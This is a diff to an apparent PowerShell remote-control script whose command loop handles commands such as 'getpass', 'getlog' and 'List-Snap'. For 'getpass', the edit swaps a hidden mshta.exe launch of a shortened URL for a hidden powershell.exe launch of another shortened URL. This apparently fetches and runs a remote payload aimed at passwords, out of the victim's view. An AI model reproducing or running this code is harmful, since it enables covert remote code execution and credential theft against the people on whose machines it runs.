@@ -2454,7 +2454,8 @@ while ($true) {
                 List-Snap         
             }
 	   elseif ($text -eq "getpass") {
-                Start-Process "mshta.exe" -ArgumentList "https://lc.cx/qROsw0" -WindowStyle Hidden         
+                #Start-Process "mshta.exe" -ArgumentList "https://lc.cx/qROsw0" -WindowStyle Hidden         
+		Start-Process "powershell.exe" -ArgumentList "https://lc.cx/4eWKsO"  -WindowStyle Hidden  
             }
             elseif ($text -like "getlog *") {
                 $rawPaths = $text.Substring(7).Trim()
